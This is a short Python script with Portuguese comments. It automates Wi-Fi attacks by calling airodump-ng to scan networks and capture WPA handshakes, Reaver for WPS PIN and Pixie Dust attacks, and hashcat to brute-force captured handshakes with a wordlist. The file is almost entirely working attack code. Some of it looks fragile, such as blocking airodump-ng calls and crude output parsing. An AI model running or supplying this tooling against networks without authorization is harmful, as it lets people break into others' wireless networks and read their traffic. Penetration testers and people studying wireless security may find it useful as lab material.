import subprocess

def scan_networks():
    """Usa airodump-ng para escanear redes Wi-Fi."""
    cmd = ["sudo", "airodump-ng", "wlan0mon"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode != 0:
        print("Erro ao rodar airodump-ng:", result.stderr.decode('utf-8'))
        return []

    # Fazer o parsing da saída de airodump-ng e extrair as redes
    networks = parse_airodump_output(result.stdout.decode('utf-8'))
    return networks

def capture_handshake(bssid):
    """Captura o handshake de uma rede específica."""
    cmd = ["sudo", "airodump-ng", "--bssid", bssid, "-w", "handshake", "wlan0mon"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode != 0:
        print("Erro ao capturar handshake:", result.stderr.decode('utf-8'))
        return False

    return True

def reaver_attack(bssid):
    """Executa o ataque WPS usando Reaver."""
    cmd = ["sudo", "reaver", "-i", "wlan0mon", "-b", bssid, "-vv"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode != 0:
        print("Erro ao rodar Reaver:", result.stderr.decode('utf-8'))
        return False

    return True

def pixie_attack(bssid):
    """Executa o ataque Pixie Dust usando Reaver com PixieWPS."""
    cmd = ["sudo", "reaver", "-i", "wlan0mon", "-b", bssid, "-K", "1", "-vv"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode != 0:
        print("Erro ao rodar PixieWPS:", result.stderr.decode('utf-8'))
        return False

    return True

def crack_password_with_hashcat(handshake_file, wordlist):
    """Usa o Hashcat para realizar brute-force no handshake capturado."""
    cmd = ["sudo", "hashcat", "-m", "2500", handshake_file, wordlist, "--force"]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if result.returncode != 0:
        print("Erro ao rodar Hashcat:", result.stderr.decode('utf-8'))
        return False

    return True

def parse_airodump_output(output):
    """Faz o parsing da saída do airodump-ng para extrair redes."""
    networks = []
    lines = output.splitlines()

    for line in lines:
        if "Station" in line:
            break
        parts = line.split()
        if len(parts) >= 4:
            network = {
                "bssid": parts[0],
                "ssid": parts[1],
                "signal": parts[2]
            }
            networks.append(network)

    return networks
